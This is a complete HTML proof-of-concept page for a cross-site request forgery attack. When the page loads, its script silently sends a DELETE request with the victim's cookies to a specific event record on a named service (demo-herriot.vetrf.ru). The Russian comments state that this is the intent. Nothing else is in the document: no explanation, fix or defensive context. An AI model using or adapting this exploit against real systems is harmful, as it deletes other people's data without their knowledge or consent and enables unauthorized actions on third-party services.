<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CSRF PoC DELETE</title>
</head>
<body>
  <script>
    // Автоматическая отправка DELETE-запроса с куками жертвы
    fetch('https://demo-herriot.vetrf.ru/api/events/2024/00017', {
      method: 'DELETE',
      credentials: 'include',           // отправляем куки
      headers: {
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json, text/plain, */*'
      }
    }).catch(() => {});
  </script>
</body>
</html>
